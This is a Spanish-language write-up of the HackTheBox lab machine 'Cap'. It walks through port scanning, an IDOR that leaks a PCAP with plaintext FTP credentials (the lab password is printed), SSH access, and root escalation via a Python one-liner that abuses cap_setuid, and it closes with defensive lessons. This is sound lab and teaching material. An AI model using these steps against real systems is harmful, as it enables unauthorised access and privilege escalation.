# Cap — HTB (Writeup)

> **Autor:** Ángel de la Vega Cuevas
> **Objetivo:** Documentar el proceso de acceso y escalada de privilegios en la máquina *Cap* (HTB/lab) para laboratorio o repositorio personal.

---

## Resumen

Se enumeró un dashboard web vulnerable a **IDOR**, lo que permitió descargar un PCAP con credenciales FTP en texto claro. Con esas credenciales se accedió por **SSH** y se escaló a root mediante una **capability mal configurada** en Python 3.8 (`cap_setuid`).

---

## 1) Descubrimiento

* **IP objetivo (lab):** `10.10.10.245` / `cap.htb`
* **OS detectado:** Linux (TTL=63)
* **Servicios detectados:** FTP (21/tcp), SSH (22/tcp), HTTP/Gunicorn (80/tcp)

```bash
ping -c 1 10.10.10.245
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.10.245 -oG cap
```

---

## 2) Enumeración web (IDOR)

El dashboard en `http://10.10.10.245` expone un endpoint `/data/<id>` para descargar capturas de red. El parámetro numérico es vulnerable a **IDOR**:

```
http://10.10.10.245/data/4  ← dato propio
http://10.10.10.245/data/0  ← dato de otro usuario → PCAP con credenciales
```

Analizando el PCAP descargado se obtienen credenciales FTP en texto claro:

```
Usuario:   nathan
Password:  Buck3tH4TF0RM3!
```

---

## 3) Acceso inicial

Las mismas credenciales funcionan tanto en FTP como en SSH:

```bash
# FTP — recuperar flag de usuario
ftp 10.10.10.245
> get user.txt

# SSH — acceso interactivo
ssh nathan@10.10.10.245
```

---

## 4) Escalada de privilegios

Enumerando capabilities del sistema:

```bash
/usr/sbin/getcap -r / 2>/dev/null
```

Se detecta:

```
/usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip
```

`cap_setuid` permite cambiar el UID del proceso a 0 (root) sin necesidad de contraseña. Explotación directa via [GTFOBins](https://gtfobins.github.io/gtfobins/python/):

```bash
python3.8 -c 'import os; os.setuid(0); os.system("/bin/sh")'
```

Shell de root obtenida:

```bash
whoami   # root
cat /root/root.txt
```

---

## 5) Flags

| Flag | Hash |
|------|------|
| `user.txt` | `[redacted]` |
| `root.txt` | `[redacted]` |

---

## 6) Notas finales

* La vulnerabilidad IDOR en `/data/<id>` es un recordatorio de que cualquier parámetro numérico en URLs debe validarse con control de acceso.
* `cap_setuid` en un intérprete como Python es equivalente a un SUID bit — siempre revisar capabilities con `getcap`.
* Credenciales en texto claro dentro de PCAPs es un hallazgo crítico en auditorías reales.
